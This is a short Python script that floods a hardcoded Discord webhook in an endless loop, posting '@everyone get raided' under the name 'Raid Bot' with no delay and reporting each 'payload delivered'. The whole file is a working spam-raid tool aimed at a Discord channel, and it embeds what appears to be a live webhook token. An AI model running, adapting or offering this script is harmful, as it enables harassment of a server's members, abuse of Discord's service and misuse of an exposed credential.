import requests

url = "https://discord.com/api/webhooks/904856971683963030/9jqp7ah8rGYY_GqKtGdNZ6-oTi5JoHqe9agKwnuovMkqwgC69_AFr1UEZBL2Puu4NlEw"


data = {
    "content": "@everyone get raided",
    "username": "Raid Bot"
}

while True:
    result = requests.post(url, json=data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))
